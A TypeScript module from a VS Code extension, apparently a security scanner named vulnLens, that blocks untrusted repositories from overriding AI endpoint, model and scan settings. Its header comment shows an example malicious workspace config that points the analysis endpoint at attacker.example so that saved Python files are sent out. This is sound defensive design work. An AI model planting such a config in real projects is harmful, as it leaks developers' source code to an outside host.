/**
 * Workspace Trust policy for security-sensitive settings.
 *
 * Settings can be written by the repository being opened. That is fine for
 * display preferences, but not for anything that decides *where code is sent*
 * or *what code is loaded*. Without this list a repository could ship
 *
 *   { "vulnLens.ai.mode": "byok",
 *     "vulnLens.byok.baseUrl": "https://attacker.example/v1",
 *     "vulnLens.ai.analyzeOnSave": true }
 *
 * and have every saved Python file posted to that endpoint without a prompt.
 *
 * Kept free of `vscode` imports so it can be unit tested, and mirrored by
 * `capabilities.untrustedWorkspaces.restrictedConfigurations` in package.json.
 */
export const RESTRICTED_IN_UNTRUSTED_WORKSPACES = [
  'vulnLens.ai.mode',
  'vulnLens.ai.analyzeOnSave',
  'vulnLens.ai.deepScan',
  'vulnLens.ai.minConfidence',
  'vulnLens.ai.concurrency',
  'vulnLens.ai.timeoutMs',
  'vulnLens.ai.maxChunks',
  'vulnLens.ollama.baseUrl',
  'vulnLens.ollama.model',
  'vulnLens.byok.baseUrl',
  'vulnLens.byok.model',
  'vulnLens.localModel.enabled',
  'vulnLens.localModel.path',
  'vulnLens.localModel.threshold',
  'vulnLens.localModel.maxChunks',
  'vulnLens.localModel.workers',
  'vulnLens.localModel.timeoutMs',
] as const;

const RESTRICTED = new Set<string>(RESTRICTED_IN_UNTRUSTED_WORKSPACES);

export function isRestrictedInUntrusted(qualifiedKey: string): boolean {
  return RESTRICTED.has(qualifiedKey);
}

export interface SettingValues<T> {
  /** `inspect().globalValue` — the user-scope value. */
  readonly global: T | undefined;
  /** `inspect().defaultValue` — the value declared in package.json. */
  readonly defaultValue: T | undefined;
  /** `get()` — the effective value, which may come from the workspace. */
  readonly effective: T | undefined;
}

/**
 * Pick the value to use for a setting.
 *
 * In a trusted workspace this is just `get()`. In an untrusted one, a
 * restricted setting ignores both workspace and workspace-folder values and
 * falls back to user scope, then to the declared default.
 */
export function chooseValue<T>(
  trusted: boolean,
  qualifiedKey: string,
  values: SettingValues<T>,
  fallback: T,
): T {
  if (!trusted && isRestrictedInUntrusted(qualifiedKey)) {
    return values.global ?? values.defaultValue ?? fallback;
  }
  return values.effective ?? fallback;
}
